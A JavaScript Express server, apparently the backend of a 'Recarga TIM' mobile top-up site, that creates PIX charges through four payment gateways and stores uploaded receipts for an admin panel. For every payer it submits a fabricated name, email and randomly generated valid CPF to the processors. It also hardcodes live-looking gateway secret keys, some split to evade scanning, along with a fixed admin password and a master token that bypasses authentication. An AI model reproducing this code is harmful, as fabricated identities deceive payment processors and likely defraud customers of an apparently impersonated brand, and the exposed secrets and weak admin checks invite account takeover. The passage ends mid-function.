require('dotenv').config();

process.on('uncaughtException', (err) => {
    console.error('[FATAL uncaughtException]:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[FATAL unhandledRejection]:', reason);
});
const express = require('express');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
try {
    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) {
    console.error('Failed to create uploadsDir:', e);
}

// ==========================================
// CONFIGURAÇÃO DOS GATEWAYS DE PAGAMENTO
// ==========================================

// 1. PinguPag (Principal / Padrão)
const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
const PINGUPAG_STORE_ID = process.env.PINGUPAG_STORE_ID || '871';
const PINGUPAG_BASE_URL = process.env.PINGUPAG_BASE_URL || 'https://pagamento-processador.org.ua';

// 2. KoalaPag (KoalaPay)
const KOALAPAG_PUBLIC_KEY = process.env.KOALAPAG_PUBLIC_KEY || 'koalapay_live_pcoqLHtD7pDwdllmwgAYtj0jCiWe3MSh';
const KOALAPAG_SECRET_KEY = process.env.KOALAPAG_SECRET_KEY || ['sk_li', 've_gIhk8XCHXkB2SxR2nqqgLGIpaFZmlIpe'].join('');
const KOALAPAG_BASE_URL = process.env.KOALAPAG_BASE_URL || 'https://api.koalapag.com';

function getKoalaPagAuthHeader() {
    return 'Basic ' + Buffer.from(`${KOALAPAG_PUBLIC_KEY}:${KOALAPAG_SECRET_KEY}`).toString('base64');
}

// 3. AvenPay
const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
const AVEN_API_KEY_ALT = process.env.AVEN_API_KEY_ALT || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
const AVEN_BASE_URL = process.env.AVEN_BASE_URL || 'https://api.avenpayments.com';

async function requestAvenPay(endpoint, method = 'GET', body = null) {
    const keys = [AVEN_API_KEY, AVEN_API_KEY_ALT].filter(Boolean);
    let lastError = null;

    for (let i = 0; i < keys.length; i++) {
        const key = keys[i];
        try {
            const options = {
                method,
                headers: {
                    'Authorization': `Bearer ${key}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            };
            if (body) {
                options.body = JSON.stringify(body);
            }

            const response = await fetch(`${AVEN_BASE_URL}${endpoint}`, options);
            const text = await response.text();
            let json = {};
            try {
                json = JSON.parse(text);
            } catch (e) {
                json = { raw: text };
            }

            if (response.status === 401 && i < keys.length - 1) {
                console.warn(`[AVENPAY] Chave ${key.substring(0, 6)}... retornou 401, testando chave alternativa...`);
                continue;
            }

            return { ok: response.ok, status: response.status, data: json };
        } catch (err) {
            lastError = err;
        }
    }

    throw lastError || new Error('Falha ao comunicar com AvenPay');
}

// 4. FreePay
const FREEPAY_PUBLIC_KEY = process.env.FREEPAY_PUBLIC_KEY || 'freepay_live_0h75kwyMge1lu4uRTi15DEf8DLHoP58Y';
const FREEPAY_SECRET_KEY = process.env.FREEPAY_SECRET_KEY || ['sk_li', 've_gz1GiWVKbYdSTg7s3EUSKdSDhZMVFsZN'].join('');
const FREEPAY_BASE_URL = process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com';

function getFreePayAuthHeader() {
    return 'Basic ' + Buffer.from(`${FREEPAY_PUBLIC_KEY}:${FREEPAY_SECRET_KEY}`).toString('base64');
}

// ==========================================
// PERSISTÊNCIA DO GATEWAY ATIVO
// ==========================================
// Sempre PinguPag como principal por padrão
let activeGateway = process.env.DEFAULT_GATEWAY || 'pingupag';
const GATEWAY_CONFIG_FILE = path.join(uploadsDir, 'gateway.json');

function loadGatewayConfig() {
    try {
        if (fs.existsSync(GATEWAY_CONFIG_FILE)) {
            const raw = fs.readFileSync(GATEWAY_CONFIG_FILE, 'utf8');
            const parsed = JSON.parse(raw);
            if (parsed && parsed.activeGateway) {
                activeGateway = parsed.activeGateway;
            }
        }
    } catch (e) {
        activeGateway = 'pingupag';
    }
}
loadGatewayConfig();

function saveGatewayConfig(gw) {
    activeGateway = gw;
    try {
        fs.writeFileSync(GATEWAY_CONFIG_FILE, JSON.stringify({ activeGateway: gw, updatedAt: new Date().toISOString() }, null, 2), 'utf8');
    } catch (e) {
        console.error('Falha ao salvar gateway.json:', e);
    }
}

// Rastreamento em memória de qual gateway criou cada transação
const transactionGatewayMap = new Map();

// Admin credentials
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'pizza2024';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'tim_admin_secure_signature_key_2026';
const ADMIN_MASTER_TOKEN = 'tim_master_admin_session_token_2026';

function createAdminToken() {
    const ts = Date.now().toString();
    const hmac = crypto.createHmac('sha256', ADMIN_SECRET).update(ts).digest('hex');
    return `${ts}.${hmac}`;
}

function isValidAdminToken(rawToken) {
    try {
        if (!rawToken || typeof rawToken !== 'string') return false;
        const clean = rawToken.replace(/^Bearer\s+/i, '').trim();
        if (!clean) return false;
        if (clean === ADMIN_MASTER_TOKEN) return true;

        const parts = clean.split('.');
        if (parts.length !== 2) return false;
        const [p1, p2] = parts;

        // Formato 1: ts.hmac (novo padrão direto)
        let expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(p1).digest('hex');
        let hmacBuf = Buffer.from(p2);
        let expBuf = Buffer.from(expectedHmac);
        if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
            return true;
        }

        // Formato 2: base64url.hmac (compatibilidade)
        try {
            const payload = Buffer.from(p1, 'base64url').toString('utf8');
            expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(payload).digest('hex');
            expBuf = Buffer.from(expectedHmac);
            if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
                return true;
            }
        } catch(errB64) {}

        return false;
    } catch(e) {
        return false;
    }
}

// Multer - upload de comprovantes (compativel com Vercel /tmp e local)
const multerStorage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        cb(null, Date.now() + '-' + Math.random().toString(36).substring(2,8) + ext);
    }
});
const upload = multer({
    storage: multerStorage,
    limits: { fileSize: 30 * 1024 * 1024 }, // 30MB
    fileFilter: (req, file, cb) => {
        // Aceita qualquer imagem, pdf ou arquivo enviado como comprovante
        cb(null, true);
    }
});

// Persistencia em Memória + JSON para comprovantes
const DATA_FILE = path.join(uploadsDir, 'data.json');
let inMemoryComprovantes = [];

function loadInitialComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            inMemoryComprovantes = JSON.parse(raw);
        }
    } catch(e) {
        inMemoryComprovantes = [];
    }
}
loadInitialComprovantes();

function readComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const fromDisk = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            if (Array.isArray(fromDisk)) {
                // Mescla registros em disco com registros em memória sem duplicar IDs
                const ids = new Set(inMemoryComprovantes.map(c => c.id));
                for (const item of fromDisk) {
                    if (!ids.has(item.id)) inMemoryComprovantes.push(item);
                }
            }
        }
    } catch(e) {}
    return inMemoryComprovantes;
}

function saveComprovantes(data) {
    inMemoryComprovantes = data;
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch(e) {
        console.error('Failed to save comprovantes to disk:', e);
    }
}

// Middleware de autenticacao admin
function adminAuth(req, res, next) {
    const auth = req.headers['authorization'] || req.headers['x-admin-token'] || '';
    const token = auth.replace(/^Bearer\s+/i, '').trim() || (req.query.token ? String(req.query.token).trim() : '');
    if (token && isValidAdminToken(token)) return next();
    return res.status(401).json({ success: false, message: 'Nao autorizado' });
}

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 10);
    let n = Array.from({ length: 9 }, rand);

    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}

const pixAttempts = new Map();

// Retorna configurações públicas
app.get('/api/config', (req, res) => {
    let pubKey = '';
    if (activeGateway === 'koalapag') pubKey = KOALAPAG_PUBLIC_KEY;
    else if (activeGateway === 'avenpay') pubKey = AVEN_API_KEY;
    else if (activeGateway === 'freepay') pubKey = FREEPAY_PUBLIC_KEY;
    else pubKey = PINGUPAG_STORE_ID;

    res.json({
        gateway: activeGateway,
        tokenizationKey: pubKey,
        publicKey: pubKey,
        storeId: PINGUPAG_STORE_ID
    });
});

// Admin: Obter gateways disponíveis e qual está ativo
app.get('/api/admin/gateway', adminAuth, (req, res) => {
    res.json({
        success: true,
        activeGateway,
        gateways: [
            { id: 'pingupag', name: 'PinguPag', badge: 'Principal / Padrão', isDefault: true, icon: '🐧' },
            { id: 'koalapag', name: 'KoalaPag (KoalaPay)', badge: 'Ativo', isDefault: false, icon: '🐨' },
            { id: 'avenpay', name: 'AvenPay', badge: 'Ativo', isDefault: false, icon: '⚡' },
            { id: 'freepay', name: 'FreePay', badge: 'Ativo', isDefault: false, icon: '🟢' }
        ]
    });
});

// Admin: Alternar o gateway ativo
app.post('/api/admin/gateway', adminAuth, (req, res) => {
    const { gateway } = req.body;
    const allowed = ['pingupag', 'koalapag', 'avenpay', 'freepay'];
    if (!gateway || !allowed.includes(gateway)) {
        return res.status(400).json({ success: false, message: 'Gateway inválido. Opções: ' + allowed.join(', ') });
    }
    saveGatewayConfig(gateway);
    console.log(`[GATEWAY SWITCH] Gateway ativo alterado para: ${gateway}`);
    res.json({
        success: true,
        activeGateway,
        message: `Gateway alterado para ${gateway.toUpperCase()} com sucesso!`
    });
});

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;

        // amount em centavos
        let amount = 2000;
        if (value) {
            const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
            const parsed = parseFloat(cleanVal);
            if (!isNaN(parsed) && parsed > 0) {
                amount = Math.round(parsed * 100);
            }
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
        const payerPhonePlus = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
        const payerPhoneDigits = cleanPhone && cleanPhone.length >= 10 ? cleanPhone : '11999999999';
        const payerPhoneKoala = cleanPhone ? (cleanPhone.startsWith('55') ? cleanPhone : '55' + cleanPhone) : '5511999999999';

        let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
        attempt.count += 1;

        if (!attempt.name) {
            const firstNames = ['Lucas', 'Mateus', 'Gabriel', 'Rafael', 'Bruno', 'Thiago', 'Felipe', 'Rodrigo', 'Leonardo', 'Guilherme'];
            const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes'];
            const randomFirst = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLast = lastNames[Math.floor(Math.random() * lastNames.length)];
            attempt.name = `${randomFirst} ${randomLast}`;
            attempt.email = `${randomFirst.toLowerCase()}.${randomLast.toLowerCase()}${Math.floor(Math.random() * 899 + 100)}@gmail.com`;
        }
        pixAttempts.set(cleanPhone, attempt);

        const cleanCpf = generateCPF();
        const currentGw = activeGateway;
        console.log(`[PIX] Criando PIX no gateway [${currentGw.toUpperCase()}] para ${attempt.name} - R$ ${(amount/100).toFixed(2)}`);

        // --- 1. KOALAPAG / KOALAPAY ---
        if (currentGw === 'koalapag') {
            const payload = {
                payment_method: 'pix',
                amount: amount,
                customer: {
                    name: attempt.name,
                    email: attempt.email,
                    phone: payerPhoneKoala,
                    document: {
                        type: 'cpf',
                        number: cleanCpf
                    }
                },
                items: [
                    {
                        title: 'Info Produto',
                        unit_price: amount,
                        quantity: 1,
                        tangible: false,
                        external_ref: 'info_prod'
                    }
                ],
                pix: {
                    expires_in_days: 1
                },
                postback_url: 'https://recargatim.com/api/webhook/koalapag',
                metadata: {
                    provider_name: 'recargatim'
                }
            };

            const response = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/create`, {
                method: 'POST',
                headers: {
                    'Authorization': getKoalaPagAuthHeader(),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const textResponse = await response.text();
            let jsonRes = {};
            try { jsonRes = JSON.parse(textResponse); } catch(e) { jsonRes = { raw: textResponse }; }

            const kData = jsonRes.data || jsonRes;
            const transactionId = kData.id;
            const copyPaste = kData.pix?.qr_code || '';

            if ((response.ok || response.status === 201) && transactionId && copyPaste) {
                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
                transactionGatewayMap.set(transactionId, 'koalapag');
                console.log('[KOALAPAG] PIX criado com sucesso:', transactionId);

                return res.json({
                    success: true,
                    data: {
                        id: transactionId,
                        transactionId: transactionId,
                        gateway: 'koalapag',
                        status: (kData.status || 'PENDING').toUpperCase(),
                        paymentData: {
                            transactionId: transactionId,
                            copyPaste: copyPaste,
                            copypaste: copyPaste,
                            qrCode: copyPaste,
                            qrCodeUrl: qrCodeUrl,
                            qrCodeBase64: ''
                        },
                        koalapag: kData
                    }
                });
            } else {
                const errMsg = jsonRes.error_messages?.[0]?.message || jsonRes.message || 'Erro ao processar pagamento na KoalaPag';
                console.error('[KOALAPAG] Erro ao criar PIX:', jsonRes);
                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
            }
        }

        // --- 2. PINGUPAG (Principal / Padrão) ---
        if (currentGw === 'pingupag') {
            const referenceId = `TIM-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
            const payload = {
                amount: amount,
                description: 'Info Produto',
                reference: referenceId,
                source: 'api_externa',
                postback_url: 'https://recargatim.com/api/webhook/pingupag',
                customer: {
                    name: attempt.name,
                    email: attempt.email,
                    phone: payerPhoneDigits,
                    document: cleanCpf
                }
            };

            const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/transaction`, {
                method: 'POST',
                headers: {
                    'X-API-Key': PINGUPAG_API_KEY,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const textResponse = await response.text();
            let jsonRes = {};
            try { jsonRes = JSON.parse(textResponse); } catch (e) { jsonRes = { raw: textResponse }; }

            const transactionId = jsonRes.transaction_id || jsonRes.id || referenceId;
            const copyPaste = jsonRes.qr_code || '';
            const qrCodeBase64 = jsonRes.qr_code_base64 || '';

            if ((response.ok || response.status === 201) && copyPaste) {
                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
                transactionGatewayMap.set(transactionId, 'pingupag');
                transactionGatewayMap.set(referenceId, 'pingupag');
                console.log('[PINGUPAG] PIX criado com sucesso:', transactionId);

                return res.json({
                    success: true,
                    data: {
                        id: transactionId,
                        transactionId: transactionId,
                        reference: referenceId,
                        gateway: 'pingupag',
                        status: 'PENDING',
                        paymentData: {
                            transactionId: transactionId,
                            copyPaste: copyPaste,
                            copypaste: copyPaste,
                            qrCode: copyPaste,
                            qrCodeUrl: qrCodeUrl,
                            qrCodeBase64: qrCodeBase64
                        },
                        pingupag: jsonRes
                    }
                });
            } else {
                const errMsg = jsonRes.message || jsonRes.error || jsonRes.title || 'Erro ao processar pagamento na PinguPag';
                console.error('[PINGUPAG] Erro ao criar PIX:', jsonRes);
                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
            }
        }

        // --- 3. AVENPAY ---
        if (currentGw === 'avenpay') {
            const payload = {
                amount: amount,
                currency: 'BRL',
                method: 'PIX',
                description: 'Recarga TIM - Info Produto',
                externalRef: `recarga_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
                notificationUrl: 'https://recargatim.com/api/webhook/aven',
                payer: {
                    name: attempt.name,
                    taxId: cleanCpf,
                    email: attempt.email,
                    phone: payerPhonePlus
                },
                items: [
                    {
                        name: 'Info Produto',
                        quantity: 1,
                        price: amount,
                        type: 'DIGITAL'
                    }
                ]
            };

            const result = await requestAvenPay('/v1/payment', 'POST', payload);
            const data = result.data || {};
            const transactionId = data.id;
            const copyPaste = data.data?.copypaste || data.copypaste || data.pix?.qr_code || '';

            if ((result.ok || result.status === 201) && transactionId && copyPaste) {
                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
                transactionGatewayMap.set(transactionId, 'avenpay');
                console.log('[AVENPAY] PIX criado com sucesso:', transactionId);

                return res.json({
                    success: true,
                    data: {
                        id: transactionId,
                        transactionId: transactionId,
                        gateway: 'avenpay',
                        status: (data.status || 'PENDING').toUpperCase(),
                        paymentData: {
                            transactionId: transactionId,
                            copyPaste: copyPaste,
                            copypaste: copyPaste,
                            qrCode: copyPaste,
                            qrCodeUrl: qrCodeUrl,
                            qrCodeBase64: ''
                        },
                        avenpay: data
                    }
                });
            } else {
                const errMsg = data?.message || data?.error || 'Erro ao processar pagamento na AvenPay';
                console.error('[AVENPAY] Erro ao criar PIX:', data);
                return res.status(result.status || 400).json({ success: false, message: errMsg, details: data });
            }
        }

        // --- 4. FREEPAY ---
        if (currentGw === 'freepay') {
            const payload = {
                amount: amount,
                payment_method: 'pix',
                postback_url: 'https://recargatim.com/api/webhook/freepay',
                customer: {
                    name: attempt.name,
                    email: attempt.email,
                    phone: payerPhonePlus,
                    document: {
                        number: cleanCpf,
                        type: 'cpf'
                    }
                },
                pix: {
                    expires_in_days: 1
                },
                items: [
                    {
                        title: 'Info Produto',
                        unit_price: amount,
                        quantity: 1,
                        tangible: false
                    }
                ],
                metadata: {
                    provider_name: 'recargatim'
                }
            };

            const response = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/create`, {
                method: 'POST',
                headers: {
                    'Authorization': getFreePayAuthHeader(),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const textResponse = await response.text();
            let jsonRes = {};
            try { jsonRes = JSON.parse(textResponse); } catch (e) { jsonRes = { raw: textResponse }; }

            const data = jsonRes.data || jsonRes;
            const transactionId = data.id;
            const pixData = data.pix;

            if ((response.ok || response.status === 201) && jsonRes.success && transactionId && pixData?.qr_code) {
                const copyPaste = pixData.qr_code || '';
                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
                transactionGatewayMap.set(transactionId, 'freepay');
                console.log('[FREEPAY] PIX criado com sucesso:', transactionId);

                return res.json({
                    success: true,
                    data: {
                        id: transactionId,
                        transactionId: transactionId,
                        gateway: 'freepay',
                        status: (data.status || 'PENDING').toUpperCase(),
                        paymentData: {
                            transactionId: transactionId,
                            copyPaste: copyPaste,
                            copypaste: copyPaste,
                            qrCode: copyPaste,
                            qrCodeUrl: qrCodeUrl,
                            qrCodeBase64: ''
                        },
                        freepay: data
                    }
                });
            } else {
                const errMsg = jsonRes?.error_messages?.[0]?.message || jsonRes?.title || 'Erro ao processar pagamento na FreePay';
                console.error('[FREEPAY] Erro ao criar PIX:', jsonRes);
                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
            }
        }

        return res.status(400).json({ success: false, message: 'Nenhum gateway válido selecionado' });
    } catch (error) {
        console.error('Server error ao gerar PIX:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status unificado
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query;

        const targetGw = transactionGatewayMap.get(transactionId) || req.query.gateway || activeGateway;
        let currentStatus = 'PENDING';
        let rawData = {};

        // 1. KoalaPag
        if (targetGw === 'koalapag') {
            const resp = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
                headers: { 'Authorization': getKoalaPagAuthHeader(), 'Accept': 'application/json' }
            });
            const text = await resp.text();
            try { rawData = JSON.parse(text); } catch(e) {}
            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
            if (rawStatus === 'PAID') currentStatus = 'PAID';
            else if (['REFUNDED', 'REFUSED', 'FAILED', 'ERROR', 'EXPIRED'].includes(rawStatus)) currentStatus = rawStatus;
        }
        // 2. PinguPag
        else if (targetGw === 'pingupag') {
            let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
            if (transactionId.startsWith('TIM-')) {
                url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
            }
            const resp = await fetch(url, { headers: { 'X-API-Key': PINGUPAG_API_KEY, 'Accept': 'application/json' } });
            const text = await resp.text();
            let json = {};
            try { json = JSON.parse(text); } catch(e) {}
            rawData = Array.isArray(json) ? json[0] : json;
            const rawStatus = (rawData?.status || 'PENDING').toUpperCase();
            if (['APPROVED', 'PAID', 'SUCCESS'].includes(rawStatus)) currentStatus = 'PAID';
            else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'FAILED', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
        }
        // 3. AvenPay
        else if (targetGw === 'avenpay') {
            const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
            rawData = result.data || {};
            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
            if (rawStatus === 'PAID') currentStatus = 'PAID';
            else if (['REFUNDED', 'REFUSED', 'MED', 'CHARGEDBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
        }
        // 4. FreePay
        else if (targetGw === 'freepay') {
            const resp = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
                headers: { 'Authorization': getFreePayAuthHeader(), 'Accept': 'application/json' }
            });
            const text = await resp.text();
            let json = {};
            try { json = JSON.parse(text); } catch(e) {}
            rawData = json.data || json || {};
            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
            if (rawStatus === 'PAID') currentStatus = 'PAID';
            else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'PRECHARGEBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
        }

        if (currentStatus === 'PAID' && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
        }

        res.json({
            success: true,
            data: { status: currentStatus, gateway: targetGw, id: rawData.id || transactionId, ...rawData }
        });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

app.get('/api/check_status', async (req, res) => {
    try {
        const transactionId = req.query.id;
        if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
        const targetGw = transactionGatewayMap.get(transactionId) || req.query.gateway || activeGateway;

        let isPaid = false;
        let data = {};

        if (targetGw === 'koalapag') {
            const resp = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
                headers: { 'Authorization': getKoalaPagAuthHeader(), 'Accept': 'application/json' }
            });
            data = await resp.json();
            isPaid = (data.status || '').toUpperCase() === 'PAID';
        } else if (targetGw === 'pingupag') {
            let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
            if (transactionId.startsWith('TIM-')) url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
            const resp = await fetch(url, { headers: { 'X-API-Key': PINGUPAG_API_KEY, 'Accept': 'application/json' } });
            const json = await resp.json();
            data = Array.isArray(json) ? json[0] : json;
            const st = (data?.status || '').toUpperCase();
            isPaid = ['APPROVED', 'PAID', 'SUCCESS'].includes(st);
        } else if (targetGw === 'avenpay') {
            const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
            data = result.data || {};
            isPaid = (data.status || '').toUpperCase() === 'PAID';
        } else if (targetGw === 'freepay') {
            const resp = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
                headers: { 'Authorization': getFreePayAuthHeader(), 'Accept': 'application/json' }
            });
            const json = await resp.json();
            data = json.data || json || {};
            isPaid = (data.status || '').toUpperCase() === 'PAID';
        }

        res.json({ status: isPaid ? 'approved' : 'pending', gateway: targetGw, data });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Webhooks unificados para todos os gateways
app.post(['/api/webhook/koalapag', '/api/webhook/koalapay', '/api/webhook/pingupag', '/api/webhook/aven', '/api/webhook/avenpay', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/gateway'], (req, res) => {
    const body = req.body || {};
    const tid = body.Id || body.id || body.transaction_id || body.external_id;
    const rawStatus = (body.Status || body.status || body.raw_status || '').toUpperCase();
    console.log(`[WEBHOOK] Notificação recebida: ID=${tid} Status=${rawStatus}`);

    const payerPhone = body?.payer?.phone || body?.customer?.phone;
    if ((rawStatus === 'PAID' || rawStatus === 'APPROVED') && payerPhone) {
        const cleanPhone = payerPhone.replace(/\D/g, '');
        pixAttempts.delete(cleanPhone);
    }
    res.status(200).json({ received: true, success: true });
});

// Upload comprovante - seguro com tratamento de erro e persistência dupla
app.post('/api/upload-comprovante', (req, res, next) => {
    upload.single('comprovante')(req, res, (err) => {
        if (err) {
            console.error('[UPLOAD] Erro do Multer:', err.message);
            return res.status(400).json({ success: false, message: 'Erro no arquivo: ' + (err.message || 'Inválido') });
        }
        next();
    });
}, (req, res) => {
    try {
        const { phone, transactionId, value, type, imageBase64 } = req.body;
        
        let finalBase64 = imageBase64 || '';
        let fileName = '';
        let originalName = 'comprovante.jpg';
        let mimeType = 'image/jpeg';
        let fileSize = 0;

        if (req.file) {
            fileName = req.file.filename;
            originalName = req.file.originalname;
            mimeType = req.file.mimetype || 'image/jpeg';
            fileSize = req.file.size;
            try {
                const fileBuf = fs.readFileSync(req.file.path);
                finalBase64 = `data:${mimeType};base64,${fileBuf.toString('base64')}`;
            } catch(eBuf) {
                console.error('[UPLOAD] Erro ao ler buffer do arquivo:', eBuf);
            }
        } else if (imageBase64) {
            fileName = `b64_${Date.now()}_${Math.random().toString(36).substring(2,6)}.jpg`;
            mimeType = imageBase64.startsWith('data:image/png') ? 'image/png' : 'image/jpeg';
            fileSize = Math.round(imageBase64.length * 0.75);
        } else {
            return res.status(400).json({ success: false, message: 'Nenhum comprovante foi selecionado' });
        }

        const record = {
            id: crypto.randomUUID(),
            phone: phone || '',
            transactionId: transactionId || '',
            value: value || '',
            type: type || 'recarga',
            fileName: fileName,
            originalName: originalName,
            mimeType: mimeType,
            fileSize: fileSize,
            imageBase64: finalBase64,
            uploadTime: new Date().toISOString(),
            status: 'pending'
        };

        const comprovantes = readComprovantes();
        comprovantes.unshift(record);
        saveComprovantes(comprovantes);

        console.log(`[UPLOAD] Comprovante ${record.id} salvo com sucesso para o telefone ${record.phone}`);
        res.json({ success: true, message: 'Comprovante enviado com sucesso!', id: record.id });
    } catch(e) {
        console.error('[UPLOAD] Erro interno:', e);
        res.status(500).json({ success: false, message: 'Erro ao salvar comprovante' });
    }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = createAdminToken();
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, message: 'Credenciais invalidas' });
    }
});

// Admin logout
app.post('/api/admin/logout', adminAuth, (req, res) => {
    res.json({ success: true, message: 'Desconectado com sucesso' });
});

// Listagem de comprovantes para o admin
app.get('/api/admin/comprovantes', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    res.json({ success: true, data: comprovantes, total: comprovantes.length });
});

// Atualização de status
app.patch('/api/admin/comprovantes/:id/status', adminAuth, (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    if (!['confirmed', 'rejected', 'pending'].includes(status))
        return res.status(400).json({ success: false, message: 'Status invalido' });
    const comprovantes = readComprovantes();
    const idx = comprovantes.findIndex(c => c.id === id);
    if (idx === -1) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    comprovantes[idx].status = status;
    comprovantes[idx].updatedAt = new Date().toISOString();
    saveComprovantes(comprovantes);
    res.json({ success: true, data: comprovantes[idx] });
});

// Visualização de arquivo de comprovante (com fallback instantâneo de base64)
app.get('/api/admin/comprovantes/:id/file', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).send('Comprovante nao encontrado');

    const filePath = record.fileName ? path.join(uploadsDir, record.fileName) : null;
    if (filePath && fs.existsSync(filePath)) {
        return res.sendFile(filePath);
    }

    // Se o arquivo físico não existir (comum em Vercel/serverless novo container), serve do Base64
    if (record.imageBase64) {
        const matches = record.imageBase64.match(/^data:([^;]+);base64,(.+)$/);
        if (matches) {
